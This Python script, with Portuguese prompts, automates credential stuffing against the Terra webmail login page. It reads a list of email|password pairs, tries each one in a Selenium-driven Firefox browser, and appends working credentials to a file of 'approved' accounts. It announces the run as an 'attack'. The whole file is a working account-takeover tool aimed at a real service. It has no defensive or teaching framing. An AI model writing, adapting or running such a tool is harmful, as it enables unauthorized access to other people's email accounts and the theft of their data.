# -*- Coding: UTF-8 -*-
#coding: utf-8
import time
import os
from selenium import webdriver



url = "https://mail.terra.com.br/"
lista = input("Nome de sua lista de emails|senhas : ")
os.system('cls' if os.name == 'nt' else 'clear')
print("\n\npreparando tudo para iniciar o ataque...............\n\n")
lista = open(lista, 'r').readlines()
lista = [linha.replace('\r\n',"") for linha in lista]
Navegador = webdriver.Firefox()



def Login_web(dados):
    try:
        Navegador.get(url)
        Navegador.find_element_by_name("username").send_keys(dados[0])
        Navegador.find_element_by_name("password").send_keys(dados[1])
        Navegador.find_element_by_xpath("/html/body/div[2]/div[1]/div[4]/div[2]/div[1]/div[1]/div/form/fieldset/div[3]/button/span").click()
        time.sleep(3)
        if url == Navegador.current_url: 
            print("[-] Login Negado ----> " + dados[0] + "|" + dados[1] + " [-]")
        else:
            print("[+] Login aprovado ----> " + dados[0] + "|" + dados[1] + " [+]")
            Navegador.delete_all_cookies()
            arquivo = open('aprovados_terra.txt','a')
            arquivo.write(dados[0] + "|" + dados[1])
            arquivo.close()
            time.sleep(2)
    except:
        print("erros")

def trataerro():
    Login_web(dados)       

for linha in lista:
    dados = linha.split('|')
    Login_web(dados)